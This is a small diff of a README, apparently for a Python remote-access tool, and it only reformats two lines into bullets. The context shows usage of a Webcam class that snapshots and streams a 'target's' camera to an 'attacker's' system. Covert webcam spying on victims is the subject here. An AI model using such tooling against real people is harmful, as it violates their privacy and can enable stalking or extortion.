@@ -53,13 +53,13 @@ cam = Webcam().snapShot(camPort)
 ```
 
 To stream the webcam view from the target to the attacker
-On target's system
+- On target's system
 
 ```python
 cam = Webcam().sender()
 ```
 
-On attacker's system
+- On attacker's system
 
 ```python
 host = "target-ip-address"
